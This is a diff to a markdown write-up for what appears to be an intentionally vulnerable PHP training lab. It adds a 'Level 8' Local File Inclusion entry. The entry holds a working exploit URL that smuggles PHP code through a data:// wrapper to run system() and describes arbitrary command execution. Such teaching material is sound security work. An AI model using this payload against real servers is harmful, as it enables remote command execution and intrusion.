@@ -57,3 +57,16 @@
 
 **Impact:** Display the content of any PHP file on hard disk drive with the privileges of HTTP server. The use of '==' is incorrect, it should be '===' or '!==' when using strpos() (see [PHP documentation](https://www.php.net/manual/en/function.strpos.php) for details).
 
+
+
+## Level 8
+
+**Vulnerability:** Local File Inclusion
+
+**Exploit:** `/Vulnerable_code/PHP/LFI/level_8.php?file=data://text/plain;charset=utf-8,%253C?php%20system(chr(0x6c).chr(0x73));//index.pdf`
+
+**Impact (with allow_url_include=On):** Execute arbitrary system commands on HTTP server. 
+
+
+
+
